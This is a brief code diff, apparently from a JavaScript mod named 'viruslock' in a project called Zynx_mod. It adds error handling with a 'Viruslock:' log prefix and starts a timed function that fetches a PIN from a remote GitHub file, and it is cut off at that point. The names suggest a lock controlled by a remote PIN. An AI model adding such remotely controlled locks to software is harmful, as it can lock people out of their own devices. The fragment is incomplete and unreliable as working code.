@@ -1,4 +1,8 @@
+try{
 iscoredetected = null;
+}catch(errr){
+    console.log("Viruslock:", errr)
+}
 (async function() {
     setTimeout(() => {
     const urlGithub = 'https://raw.githubusercontent.com/kenzz-sz/Zynx_mod/refs/heads/main/mods/viruslock/pin.txt';
